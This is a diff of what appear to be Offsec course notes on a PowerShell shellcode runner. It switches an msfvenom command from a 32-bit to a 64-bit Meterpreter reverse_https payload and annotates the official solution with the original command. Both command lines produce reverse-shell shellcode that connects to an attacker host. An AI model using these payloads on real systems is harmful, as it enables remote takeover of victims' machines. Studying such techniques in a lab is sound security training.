@@ -13,7 +13,7 @@ Similar to CSharp, the theory is to:
 First, generate the shellcode using msfvenom:
 
 ```
-msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1
 ```
 
 Then put it into the Powershell code below:
@@ -50,7 +50,7 @@ Note:
 * Can remove all the `[return: MarshalAs(...)]`
 * Sometimes the DLL might not be correct, refer back to MSDN for the final confirmation
 
-Official Solution from Offsec:
+Official Solution from Offsec (using `msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1`):
 
 ```powershell
 $Kernel32 = @"
